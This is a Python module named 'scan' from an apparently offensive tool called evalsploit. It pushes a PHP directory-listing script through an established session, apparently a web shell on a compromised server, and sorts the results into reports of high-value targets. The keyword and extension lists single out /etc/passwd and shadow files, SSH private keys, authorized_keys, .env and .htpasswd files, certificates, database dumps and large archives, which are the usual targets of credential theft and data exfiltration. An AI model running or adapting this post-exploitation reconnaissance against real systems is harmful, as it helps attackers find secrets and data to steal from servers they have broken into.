"""scan: recursive directory scan."""

from __future__ import annotations

import os
from pathlib import Path
from typing import TYPE_CHECKING, Optional

from evalsploit.config import project_root
from evalsploit.modules.base import substitute, php_quote
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


@register("scan", description="Recursive filesystem scan, saves categorized report to report/", usage="scan [path]")
class ScanModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        where = ctx.resolve_path(args.strip()) if args.strip() else ctx.pwd
        sbd_php = project_root() / "scan" / "sbd" / "sbd.php"
        if not sbd_php.exists():
            print("scan/sbd/sbd.php not found")
            return None
        data = sbd_php.read_text(encoding="utf-8", errors="replace")
        data = substitute(data, {"$directory = __DIR__;": f"$directory = {php_quote(where)};"})
        lists = ctx.send(data)
        report_dir = project_root() / "report"
        report_dir.mkdir(parents=True, exist_ok=True)
        (report_dir / "map.txt").write_text(lists, encoding="utf-8", errors="ignore")
        print("Local scan...")
        php = ["config", "c_option", "adminer", "passwd", "local", "settings"]
        allcool = ["config", "_log", "adminer", "passwd", "shadow", "_history", "tomcat-users", "authorized_keys", "id_dsa", "id_rsa", "identity", "sites-enabled", "vhosts", "settings", "dockerfile"]
        a = b = c = d = e = f = g = h = j = 0
        with open(report_dir / "map.txt", encoding="utf-8", errors="ignore") as file:
            phpinterest = open(report_dir / "php.txt", "w", encoding="utf-8", errors="ignore")
            extinterest = open(report_dir / "ext.txt", "w", encoding="utf-8", errors="ignore")
            databases = open(report_dir / "DB.txt", "w", encoding="utf-8", errors="ignore")
            BIGdatabases = open(report_dir / "BIG_DB.txt", "w", encoding="utf-8", errors="ignore")
            archives = open(report_dir / "arch.txt", "w", encoding="utf-8", errors="ignore")
            BIGarchives = open(report_dir / "BIG_arch.txt", "w", encoding="utf-8", errors="ignore")
            interesting = open(report_dir / "coolfiles.txt", "w", encoding="utf-8", errors="ignore")
            certs = open(report_dir / "certs.txt", "w", encoding="utf-8", errors="ignore")
            try:
                for line in file:
                    j += 1
                    if len(line) > 2 and "R" == line[0] and line[2] == " ":
                        parts = line.split(" | ")
                        if len(parts) < 3:
                            continue
                        name = str(os.path.basename(parts[2])).strip().lower()
                        try:
                            weight = int(parts[1].strip())
                        except ValueError:
                            weight = 0
                        ext = str(os.path.splitext(parts[2])[1]).strip().lower()
                        if ext == ".php":
                            if any(x in name for x in php):
                                a += 1
                                phpinterest.write(line)
                        if ext in (".htpasswd", ".env", ".log", ".docker", ".txt", ".cfg", ".conf", ".kbdx"):
                            b += 1
                            extinterest.write(line)
                        if ext in (".pub", ".pmk", ".key", ".pgp", ".pem", ".crt", ".ca"):
                            c += 1
                            certs.write(line)
                        if ext in (".sql", ".sqlite", ".db", ".csv", ".bak"):
                            d += 1
                            databases.write(line)
                            if weight > 104857600:
                                e += 1
                                BIGdatabases.write(line)
                        if ext in (".tgz", ".gz", ".tar", ".bz2", ".tlz", ".lz", ".txz", ".tbz2", ".genozip", ".7z", ".s7z", ".rar", ".zip", ".sfx"):
                            f += 1
                            archives.write(line)
                            if weight > 104857600:
                                g += 1
                                BIGarchives.write(line)
                        if any(x in name for x in allcool):
                            h += 1
                            interesting.write(line)
            finally:
                phpinterest.close()
                extinterest.close()
                databases.close()
                BIGdatabases.close()
                archives.close()
                BIGarchives.close()
                interesting.close()
                certs.close()
        print("SCAN COMPLETE")
        print("Total files:    ", j)
        print("System PHP:    ", a)
        print("Interesting ext:", b)
        print("Certs/keys:    ", c)
        print("Databases:     ", d)
        print("DB > 100MB:    ", e)
        print("Archives:      ", f)
        print("Archives >100MB:", g)
        return None
